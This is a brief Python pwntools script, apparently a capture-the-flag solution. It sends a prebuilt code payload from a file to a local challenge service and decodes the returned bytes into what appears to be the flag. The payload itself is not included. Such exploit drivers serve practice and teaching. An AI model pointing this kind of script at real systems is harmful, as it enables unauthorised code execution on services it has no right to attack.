from pwn import *


chall   = remote('127.0.0.1', 9020)
fh      = open('./solve-dir/pwn.bin', 'rb') # generated by ./solve-dir/build_pwn.c
payload = fh.read() 

chall.send(payload)
chall.recvuntil('Executing code!\n\x1b[0m')
chall.recv(4)
resp = chall.recv()

final        = ''
bits_counter = 0

for i in resp:
    final += chr(i+41) if bits_counter % 32 == 0 else chr(i)
    bits_counter += 8
    if final[-1:] == '}':
        break 
    
print(final)
